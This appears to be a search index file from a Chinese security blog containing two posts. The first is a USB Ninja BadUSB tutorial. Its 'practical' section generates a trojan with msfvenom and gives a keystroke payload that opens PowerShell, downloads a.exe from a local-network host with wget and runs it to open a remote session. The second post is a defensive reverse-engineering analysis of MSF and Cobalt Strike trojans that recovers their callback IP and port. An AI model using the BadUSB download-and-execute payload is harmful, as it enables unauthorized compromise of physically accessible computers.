<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>UsbNinja 物理黑客</title>
    <url>/2023/04/24/USB%20Ninja%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是BadUsb"><a href="#什么是BadUsb" class="headerlink" title="什么是BadUsb"></a>什么是BadUsb</h1><p>其实最根本的原理就是模拟了键盘输入，利用了一个键盘控制芯片<br>因为可以接触到目标计算机了，因此直接插入目标计算机，让人防不胜防</p>
<h1 id="UsbNinja"><a href="#UsbNinja" class="headerlink" title="UsbNinja"></a>UsbNinja</h1><h2 id="图片展示"><a href="#图片展示" class="headerlink" title="图片展示"></a>图片展示</h2><p><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095720554.png" alt="image-20230721095720554"></p>
<h2 id="操作原理"><a href="#操作原理" class="headerlink" title="操作原理"></a>操作原理</h2><p>3代USB ninja 拥有了蓝牙功能，如果资金不够，可以不买遥控器，直接使用手机蓝牙控制<br><code>[USBNinjaProfessional](https://github.com/USBNinjaRRG/USBNinjaProfessional)</code><br>手机控制apk下载链接 <a href="https://github.com/USBNinjaRRG/USBNinjaProfessional">https://github.com/USBNinjaRRG/USBNinjaProfessional</a><br>苹果直接在Apple Store中下载即可</p>
<hr>
<p>usb在插入后会自动创建一个蓝牙信号，利用手机的控制端连接该蓝牙即可控制<br>创建蓝牙信息<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095739002.png" alt="image-20230721095739002"><br>控制端<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095751838.png" alt="image-20230721095751838"><br>连接蓝牙<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095809050.png" alt="image-20230721095809050"><br>payload写法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/26110731/1680336606208-40417893-3326-4488-b889-17a17220fee6.png#averageHue=%23e3bf81&clientId=uca5575ce-27d6-4&from=paste&height=988&id=uc9c63570&originHeight=988&originWidth=1301&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79001&status=done&style=none&taskId=ud65ce758-e277-415e-b750-b0ba11f6c3b&title=&width=1301" alt="image.png"></p>
<hr>
<p>先放一个payload在这里，作用是在目标桌面创建一个名为1.txt的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gui d</span><br><span class="line">delay 500</span><br><span class="line">gui r</span><br><span class="line">delay 500</span><br><span class="line">string powershell</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">Delay 500</span><br><span class="line">string cd desktop</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">string echo hello &gt; hi.txt</span><br><span class="line">Delay 500</span><br><span class="line">Enter</span><br></pre></td></tr></table></figure>

<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="1-创建木马"><a href="#1-创建木马" class="headerlink" title="1.创建木马"></a>1.创建木马</h2><p>msfvenom生成木马<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095817749.png" alt="image-20230721095817749"></p>
<p>msfconsole 打开监听端<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095828420.png" alt="image-20230721095828420"></p>
<h2 id="2-写入payload"><a href="#2-写入payload" class="headerlink" title="2.写入payload"></a>2.写入payload</h2><p>Windows的powershell拥有wget功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gui d</span><br><span class="line">Delay 500</span><br><span class="line">gui r</span><br><span class="line">delay 500</span><br><span class="line">string powershell</span><br><span class="line">delay 500</span><br><span class="line">enter</span><br><span class="line">Delay 500</span><br><span class="line">String cd desktop</span><br><span class="line">Enter</span><br><span class="line">Delay 500</span><br><span class="line">String wget http://192.168.31.164:8000/a.exe -o a.exe</span><br><span class="line">Delay 1000</span><br><span class="line">Enter</span><br><span class="line">String .\a.exe</span><br><span class="line">Delay 500</span><br><span class="line">Enter </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3-上线主机"><a href="#3-上线主机" class="headerlink" title="3.上线主机"></a>3.上线主机</h2><p><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230721095836124.png" alt="image-20230721095836124"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>物理渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>溯源CS_MSF木马</title>
    <url>/2023/04/24/%E6%BA%AF%E6%BA%90CS_MSF%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Linux-ELF文件分析"><a href="#1-Linux-ELF文件分析" class="headerlink" title="1.Linux ELF文件分析"></a>1.Linux ELF文件分析</h1><p>使用msf生成木马，然后拖进IDA工具进行分析<br>以下网站针对Linux_syscall函数<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720170937017.png" alt="image-20230720170937017"><br>syscall使用<code>rax</code>寄存器进行参数调用<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720170921552.png" alt="image-20230720170921552"><br><code>sys_connect</code> 总共调用了3个参数分别是 <code>fd</code>类型，<code>ip</code> 信息，<code>数据长度</code> 这边重点看rsi寄存器，可以看到<code>0A21FA8C00F270002</code>这段数据就是地址协议信息，因为是小端序的问题，将数据倒着看<br><code>0200270FC0A81FA200</code><br><code>0200</code>:AF_INET <strong>标注协议类型</strong><br><code>**270F**</code><strong>:9999</strong><br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171001938.png" alt="image-20230720171001938">)<br><code>C0A81FA2</code>: 192 168 31 162</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">LOAD:<span class="number">00000000004000</span>AC                 mov     rcx, <span class="number">0</span>A21FA8C00F270002h</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>6                 push    rcx</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>7                 mov     rsi, rsp        ; uservaddr</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>A                 push    <span class="number">10</span>h</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>C                 pop     rdx             ; addrlen</span><br><span class="line">LOAD:<span class="number">00000000004000B</span>D                 push    <span class="number">2</span>Ah ; <span class="string">&#x27;*&#x27;</span></span><br><span class="line">LOAD:<span class="number">00000000004000B</span>F                 pop     rax</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C0                 syscall                 ; LINUX - sys_connect</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C2                 pop     rcx</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C3                 test    rax, rax</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C6                 jns     <span class="type">short</span> loc_4000ED</span><br><span class="line">LOAD:<span class="number">00000000004000</span>C8                 dec     r9</span><br><span class="line">LOAD:<span class="number">00000000004000</span>CB                 jz      <span class="type">short</span> loc_4000E5</span><br></pre></td></tr></table></figure>
<p>关于sockaddr sockaddr_in 结构体<br><a href="https://www.jb51.net/article/117902.htm">https://www.jb51.net/article/117902.htm</a></p>
<h2 id="Windows-CS木马分析"><a href="#Windows-CS木马分析" class="headerlink" title=".Windows CS木马分析"></a>.Windows CS木马分析</h2><p>针对dll文件分析，首先生成dll文件<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171016830.png" alt="image-20230720171016830">常用dll手段一般是 白（exe）+黑（dll）<br>接下来直接拖到ida里面<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171037748.png" alt="image-20230720171037748"><br>CreateThread的第二个参数为函数运行的指针<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171045510.png" alt="image-20230720171045510"><br>发现程序又创建了一个指针然后又return <code>15B2</code>里面去了，继续跟进<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171054992.png" alt="image-20230720171054992"><br>这个页面猜测可能是程序又释放了一些文件<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171104150.png" alt="image-20230720171104150"><br>来到了这个页面，看到了常见的木马三部曲 创建内存区块 修改执行权限 创建线程<br>如果读取到了VirtualAlloc创建的内存，就可以得到真正程序执行的shellcode<br>x6dbg走起<br>首先运行<br>C:\Windows\System32\rundll32.exe 使用x64dbg调试即可<br>然后修改命令行为<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171112183.png" alt="image-20230720171112183"><br>然后选项-&gt;事件<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171120729.png" alt="image-20230720171120729"><br>启动调试，否则程序会直接闪过去不在dll位置停止<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171131178.png" alt="image-20230720171131178">在artifact.dll位置停下，已经到了dll加载的地址了<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171141365.png" alt="image-20230720171141365"><br>在该地址处断下<img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171151334.png" alt="image-20230720171151334"><br>可以简单的代码复原一下，这个就是一个while循环，中间又一个sleep函数，会影响调试器正常使用，使用nop指令填充即可<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171159266.png" alt="image-20230720171159266"><br>在<code>15F7</code>处下一个断点，然后进入<code>176E</code>在<code>1770</code>处下一个断点<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171209825.png" alt="image-20230720171209825"><br>然后继续运行程序<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171217646.png" alt="image-20230720171217646"><br>在rax处得到VirtualAlloc创建的内存地址<br>在CreateThread前面下断点<br>在内存布局中转入到VirtualAlloc创建的内存地址<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171227218.png" alt="image-20230720171227218"><br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171247025.png" alt="image-20230720171247025"><br>将导入的bin文件直接扔到ida里面去得到ip地址<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171258346.png" alt="image-20230720171258346"><br>端口为第271个byte处<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171306663.png" alt="image-20230720171306663"><br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171315805.png" alt="image-20230720171315805">)<br><img src="https://raw.githubusercontent.com/yifaang/picture/main/test/image-20230720171325090.png" alt="image-20230720171325090"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>逆向溯源</tag>
      </tags>
  </entry>
</search>
